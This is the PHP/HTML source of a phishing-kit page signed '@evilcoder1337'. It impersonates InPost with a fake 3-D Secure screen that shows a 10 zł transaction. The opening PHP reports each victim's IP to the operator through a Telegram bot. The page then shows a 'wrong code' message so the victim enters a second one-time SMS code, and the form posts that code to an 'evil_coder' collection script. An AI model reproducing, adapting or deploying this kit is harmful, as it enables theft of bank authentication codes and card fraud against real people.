<?php
session_start();
error_reporting(0);
include'../evil_coder/Functions/Fuck-you.php'; 
include("../config.php");
$ip = "{$_SESSION['ip']}";
$msg = "
|⚠️ VICTIM IN 2ND SMS PAGE ⚠️
|IP	: $ip 
|BY :- @evilcoder1337
";
$token = "$botkey";
    $data = [
    'text' => $msg,
    'chat_id' => $teleid,
    ];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );



/*   
		██████████          ███████       █████████    █████       █████ ████████         
		░░███░░░░░█         ░░░░░███      ███░░░░░███ ███░░░███    ░░███ ███░░░░███        
		░███  █ ░█████ ████████░███     ███     ░░░ ███   ░░███ ███████░░░    ░██████████ 
		░██████ ░░███ ░░██░░███░███    ░███        ░███    ░██████░░███   ██████░░███░░███
		░███░░█  ░███  ░███░███░███    ░███        ░███    ░██░███ ░███  ░░░░░░██░███ ░░░ 
		░███ ░   ░░███ ███ ░███░███    ░░███     ██░░███   ███░███ ░███ ███   ░██░███     
		██████████░░█████  █████████    ░░█████████ ░░░█████░ ░░███████░░█████████████    
		░░░░░░░░░░  ░░░░░  ░░░░░░░░░      ░░░░░░░░░    ░░░░░░   ░░░░░░░░ ░░░░░░░░░░░░░    
		
		
		ICQ & TELEGRAM : @evilcoder1337
*/


if (!isset($_GET['inpost_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Uprawomocnić</title>
  <link href="./files/template-abfb130084.css" rel="stylesheet">
  
  
  <link href="./files/validateview-451126d279.css" rel="stylesheet">
  <style>body {color: #000000;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 1.25em}.header, legend, h1, h2, h3, h4 {color: #000000}label {color: #000000}a,.btn-link {color: #000000;text-decoration: underline}a:visited,.btn-link:visited {color: #000000}a:hover,a:focus,.btn-link:hover,.btn-link:focus {color: #ffcd00}a:active,.btn-link:active {color: #ffcd00}a.btn-link {font-size: .95em}.btn-primary,.btn-primary:focus,.btn-primary:hover {background: #ffcd00;color: #000;border: none;border-radius: 0}.btn-primary:active,.btn-primary:active:hover,.btn-primary:active:focus {background: #AB2C29}fieldset {border: 0}fieldset > legend {border-bottom: 0;font-size: 1.00em}:not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before {background: #ffcd00}.accordion.modal .modal-body .panel-group .expander {color: #ffcd00}.accordion.modal .modal-body .panel-group .panel {background: #FFF}.field-validation-error {color: #AB2C29}.toast-top-full-width {display: none}</style>


</head>
<body cz-shortcut-listen="true">
  <div class="threeds-one">
    


<div class="container container-sticky-footer">
  

<div class="header" id="HeaderLogos">
  <div class="row no-pad">
    <div class="col-12">
      <img  class="img-responsive header-logo pull-right" src="./files/vm.gif">
    </div>
  </div>
</div>
  


<div class="container container-sticky-footer">
<form action="../evil_coder/proc/evilc_error.php" autocomplete="off"  method="post">  
   
    <div class="body" dir="LTR" style="bottom: 56px;">
      

    <h1 class="screenreader-only">Twój jednorazowy kod dostępu został wysłany</h1>

      <br>
      <div class="row">
      </div>
      <div class="row">
          <div class="col-12" id="ValidateOneUpMessage">
              <div id="Body1">Aby kontynuować transakcję, wprowadź jednorazowy kod dostępu wysłany na Twój numer telefonu komórkowego i kliknij Prześlij.</div>
          </div>
      </div>

      <br>

      <div class="row form-two-col">
        <div class="col-12">
            <fieldset id="ValidateTransactionDetailsContainer">
                <legend id="ValidateTransactionDetailsHeader">szczegóły transakcji</legend>

                <div class="validate-field row">
                    <span class="validate-label col-6">Kupiec:</span>
                    <span class="col-6">InPost sp. z o.o</span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6">Suma transakcyjna:</span>
                    <span class="col-6 always-left-to-right">10 Zł</span>
                </div>

                
                <div class="validate-field row">
                        <span class="validate-label col-6">Wprowadź kod:</span>
    <span>
      <label for="Credential_Value" hidden="">Wprowadź swój kod</label>
      <input type="hidden" name="ovnimdf" value="C^7$yzv-=9Tz!!u">
      <input  data-val-required="Please enter your code" required=""  name="sms2" id="sms2" type="text">
 															<script src="files/js/mask.js"></script>
                                    													<script>
                                    													var element = document.getElementById('sms2');
                                    													var maskOptions = {mask: '000000'};
                                    													var mask = IMask(element, maskOptions);
                                    												    </script>       
    </span>

                </div>
                <div class="validate-field row">
                    <span class="validate-label col-6">&nbsp;</span>
                    <span id="ValidationErrorMessage" class="field-validation-error" style="display: none;"></span>
                    <span class="field-validation-valid col-6" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                </div>
            </fieldset>
        </div>
      </div>
      <a style="color:#FF0000;" > wrong code</a>
      </br>
      <div class="row">
        <div class="col-12">
            <div id="linkContainer">
                <a href="./timeout/re.php" >Kliknij tutaj, aby otrzymać kolejny kod</a>
  
                
                
            </div>
             <span id="MaximumResendsReachedMessage" style="display:none">Osiągnąłeś maksymalną liczbę próśb o nowy kod</span>
        </div>
      </div>
    </div>
    <div class="sticky-footer">
      <div class="row no-pad">
        <div class="col-12 text-center">
          <button type="submit" class="btn btn-primary" id="ValidateButton">Składać</button>
        </div>
      </div>
      

<div class="footer">
  <div class="row">
    <div class="col-12">
      <ul class="list-inline list-inline-separated pull-left"><li><a class="btn btn-link" data-target="#FAQ" data-toggle="modal" href="#FAQ">Potrzebuję pomocy?</a></li></ul>
      <a class="list-inline list-inline-separated pull-right" href="./timeout/exit.php">Wyjście</a>
    </div>
  </div>
</div>
    </div>
<input id="TransactionId" name="TransactionId" type="hidden" value="Vv2nitDUYK8bCGxAmB73MljWbjm1"><input data-val="true" data-val-number="The field ValidateTimeout must be a number." id="ValidateTimeout" name="ValidateTimeout" type="hidden" value=""><input id="IssuerId" name="IssuerId" type="hidden" value="5e7b7d6f260f434e93b86885"><input id="OtpResendTimeout" name="OtpResendTimeout" type="hidden" value="0"><input data-val="true" data-val-required="The ValidateReloadEnabled field is required." id="ValidateReloadEnabled" name="ValidateReloadEnabled" type="hidden" value="False"></form></div>

<div class="modal modal-clear" id="ProcessingModal" tabindex="-1" role="dialog" aria-labelledby="Processing-label" aria-hidden="true" data-keyboard="false" data-backdrop="static">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-body">
        <div class="row">
          <div class="col-12 processing">
            <img id="ProcessingImage" src="./files/loading.svg" alt="Loading Indicator" class="processing-img center-block content-block">
            <p class="processing-text" id="Processing-label">Przetwarzanie</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>


<form action="/Api/NextStep/StepUp" autocomplete="off" data-ajax="true" data-ajax-begin="ccHelpers.ajax.onBegin" data-ajax-complete="ccHelpers.ajax.onComplete" data-ajax-failure="ccHelpers.ajax.onFailure" data-ajax-method="form" data-ajax-success="ccHelpers.ajax.onSuccess" id="StepupForm" method="post" name="StepupForm"><input id="HiddenTransactionId" name="TransactionId" type="hidden" value="Vv2nitDUYK8bCGxAmB73MljWbjm1"><input id="StepUpIssuerId" name="IssuerId" type="hidden" value="5e7b7d6f260f434e93b86885"></form>


  <input data-val="true" data-val-number="The field MessageVersion must be a number." data-val-required="The MessageVersion field is required." id="MessageVersion" name="MessageVersion" type="hidden" value="1">
  <div class="modal fade" id="FAQ" tabindex="-1" role="dialog" aria-labelledby="FAQ-label">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">×</span>
        </button>
        <h4 class="modal-title" id="FAQ-label">Potrzebuję pomocy?</h4>
      </div>
      <div class="modal-body partial-modal">
          <div><p>W przypadku jakichkolwiek pytań prosimy o kontakt z NOW Money's
zespołu obsługi klienta pod numerem 800 669 6639 lub porozmawiaj z nimi za pomocą aplikacji
 usługa czatu!</p>
</div>
      </div>
    </div>
  </div>
</div>
  <form class="nextstep-form" method="post">
  <input id="NextStepTransactionId" name="TransactionId" type="hidden" value="Vv2nitDUYK8bCGxAmB73MljWbjm1">
  <input id="GroupId" name="GroupId" type="hidden" value="">
  <input id="Type" name="Type" type="hidden" value="">
  
  <input id="NextStepChoiceType" name="NextStepChoiceType" type="hidden" value="">
  <input id="NextStepIssuerId" name="IssuerId" type="hidden" value="5e7b7d6f260f434e93b86885">
</form>
  <form method="POST" id="TermForm">
  <input type="hidden" id="PaRes" name="PaRes" value="">
  <input type="hidden" id="MD" name="MD" value="">
</form>
</div>


  </div>




</body></html>